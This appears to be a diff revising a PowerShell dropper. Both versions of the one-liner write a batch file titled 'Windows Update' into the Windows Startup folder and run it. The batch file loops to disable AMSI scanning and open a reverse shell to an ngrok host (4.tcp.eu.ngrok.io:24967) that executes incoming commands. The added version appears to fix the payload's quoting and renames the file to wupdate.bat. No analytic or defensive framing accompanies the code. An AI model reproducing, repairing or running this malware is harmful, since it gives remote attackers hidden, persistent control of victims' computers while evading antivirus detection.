@@ -1,7 +1,6 @@
-powershell -NoP -NonI -W Hidden -Exec Bypass -C "$bat=@'@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -C "$content='@echo off
 title Windows Update
 :loop
-powershell -NoP -NonI -W Hidden -Exec Bypass -C \"$z='System.Management.Automation.AmsiUtils';[Ref].Assembly.GetType($z).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$client=New-Object System.Net.Sockets.TCPClient('4.tcp.eu.ngrok.io',24967);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"
+powershell -NoP -NonI -W Hidden -Exec Bypass -C \"$z=''System.Management.Automation.AmsiUtils'';[Ref].Assembly.GetType($z).GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);$client=New-Object System.Net.Sockets.TCPClient(''4.tcp.eu.ngrok.io'',24967);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+''PS ''+(pwd).Path+''> ''; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"
 timeout /t 5 /nobreak >nul
-goto loop
-'@;$p=\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat\";$bat|Out-File $p -Encoding ASCII -Force;Start-Process $p"
+goto loop'; $path=\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wupdate.bat\"; $content|Out-File $path -Encoding ASCII -Force; Start-Process $path"
